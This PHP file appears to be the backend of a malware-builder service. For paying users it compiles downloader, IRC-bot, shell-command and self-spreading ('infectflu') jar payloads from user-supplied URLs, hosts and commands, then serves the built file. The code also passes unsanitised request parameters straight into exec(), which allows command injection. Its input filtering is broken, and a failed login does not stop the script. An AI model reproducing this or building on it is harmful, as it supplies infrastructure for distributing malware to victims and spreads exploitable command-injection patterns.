<?php

include_once '/var/www/ctrl/accounts/operations.php';

$builder = "/home/edev/builder/builder.jar";

$user = "0";
$uid = 0;

if(isset($_COOKIE['user'])) {
	$result = check_auth($_COOKIE['user']);
	if($result['success'] == true) {
		$user = $result['username'];
		$uid = $result['uid'];
	} else {
		echo json_encode(array("success"=>false,"error"=>"You are not logged in."));
	}
} else {
	echo json_encode(array("success"=>false,"error"=>"You are not logged in."));
}


if(!isset($_GET['id'])) {
	echo json_encode(array("success"=>false,"error"=>"Product ID missing."));
	exit;
}

$id = $_GET['id'];

if(!user_owns($id, $user)) {
	echo json_encode(array("success"=>false,"error"=>"You do not own this product."));
	exit;
}

foreach($_POST as $key => $value) {
	$_POST[$key] = str_replace("&", "", $value);
	$_POST[$key] = str_replace(";", "", $value);
}

if($id == 1) {
	// mosdl
	
	exec("java -jar " . $builder . " mosdl ". $uid . " noexpiry " . urldecode($_GET['unixurl']) . " " . urldecode($_GET['macurl']) . " " . urldecode($_GET['windowsurl']) . " " . urldecode($_GET['solarisurl']));
	
	$file = '/var/www/html/dl/mosdl-' . $uid . '.jar';
	if(file_exists($file))
	{
		usleep(5000000);
		header('Set-Cookie: fileDownload=true; path=/');
		header('Content-Description: File Transfer');
		header('Content-Disposition: attachment; filename="mosdl.jar"');
		header('Content-Length: ' . filesize($file));
	
		$handle = fopen($file, 'r');
		while (!feof($handle))
		{
			echo fgets($handle, 2048);
		}
		fclose($handle);
	
		unlink($file);
	} else {
		echo json_encode(array("success"=>false,"error"=>"File was not built correctly."));
	}
} else if($id == 2) {
	// irc
	
	exec("java -jar " . $builder . " irc ". $uid . " noexpiry " . $_GET['prefix'] . " " . $_GET['host'] . " " . $_GET['port'] . " " . urldecode($_GET['channel']) . " " . $_GET['filename']);
	
	$file = '/var/www/html/dl/irc-' . $uid . '.jar';
	if(file_exists($file))
	{
		usleep(5000000);
		header('Set-Cookie: fileDownload=true; path=/');
		header('Content-Description: File Transfer');
		header('Content-Disposition: attachment; filename="irc.jar"');
		header('Content-Length: ' . filesize($file));
	
		$handle = fopen($file, 'r');
		while (!feof($handle))
		{
			echo fgets($handle, 2048);
		}
		fclose($handle);
	
		unlink($file);
	} else {
		echo json_encode(array("success"=>false,"error"=>"File was not built correctly."));
	} 
} else if($id == 3) {
	// shellexec
	exec("java -jar " . $builder . " shellexec ". $uid . " noexpiry " . $_GET['wcmd'] . " " . $_GET['mcmd'] . " " . $_GET['lcmd']);

	$file = '/var/www/html/dl/shellexec-' . $uid . '.jar';
	if(file_exists($file))
	{
		usleep(5000000);
		header('Set-Cookie: fileDownload=true; path=/');
		header('Content-Description: File Transfer');
		header('Content-Disposition: attachment; filename="irc.jar"');
		header('Content-Length: ' . filesize($file));
	
		$handle = fopen($file, 'r');
		while (!feof($handle))
		{
			echo fgets($handle, 2048);
		}
		fclose($handle);
	
		unlink($file);
	} else {
		echo json_encode(array("success"=>false,"error"=>"File was not built correctly."));
	}
} else if($id == 4) {
	// infectflu
	
	exec("java -jar " . $builder . " infectflu ". $uid . " noexpiry " . $_GET['message'] . " " . $_GET['url']);

	$file = '/var/www/html/dl/infectflu-' . $uid . '.jar';
	if(file_exists($file))
	{
		usleep(5000000);
		header('Set-Cookie: fileDownload=true; path=/');
		header('Content-Description: File Transfer');
		header('Content-Disposition: attachment; filename="irc.jar"');
		header('Content-Length: ' . filesize($file));
	
		$handle = fopen($file, 'r');
		while (!feof($handle))
		{
			echo fgets($handle, 2048);
		}
		fclose($handle);
	
		unlink($file);
	} else {
		echo json_encode(array("success"=>false,"error"=>"File was not built correctly."));
	}
}